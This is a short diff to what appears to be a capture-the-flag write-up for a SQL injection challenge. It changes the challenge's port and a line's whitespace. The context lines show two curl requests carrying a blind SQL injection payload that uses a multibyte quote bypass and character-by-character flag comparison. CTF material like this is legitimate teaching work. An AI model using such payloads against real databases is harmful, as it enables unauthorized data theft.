@@ -8,7 +8,7 @@ Not so easy SQL injection at all.
 ```
 It is all in the challenge.
 
-http://ctf.pwn.sg:8180
+http://ctf.pwn.sg:9180
 ```
 
 *Creator - quanyang (@quanyang)*
@@ -26,6 +26,6 @@ http://ctf.pwn.sg:8180
 
 curl 'http://localhost:8180/?search' --data 'username=1%bf%27||(SUBSTR(flag,1,1)in(0x43)%26%26(username)in(0x61646D696E));#&action='
 
-versus 
+versus
 
 curl 'http://localhost:8180/?search' --data 'username=1%bf%27||(SUBSTR(flag,1,1)in(0x42)%26%26(username)in(0x61646D696E));#&action='
